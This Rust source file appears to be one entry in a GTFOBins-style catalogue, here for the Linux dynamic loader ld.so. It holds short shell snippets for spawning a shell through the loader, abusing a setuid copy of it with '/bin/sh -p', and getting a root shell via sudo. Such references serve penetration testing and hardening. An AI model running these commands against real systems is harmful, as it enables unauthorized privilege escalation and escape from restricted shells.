pub static BIN_NAME: &'static str = "ld.so";
pub static BIN_DESC: &'static str = "`ld.so` is the Linux dynamic linker/loader, its filename and location might change across distributions. The proper path is can be obtained with:";
pub static BIN_CODE: &'static str = r#"
    
    $ strings /proc/self/exe | head -1
    /lib64/ld-linux-x86-64.so.2
"#;
pub static SH_CODE: &'static str = r#"
    
    /lib/ld.so /bin/sh
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which ld.so) .

    ./ld.so /bin/sh -p
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo /lib/ld.so /bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
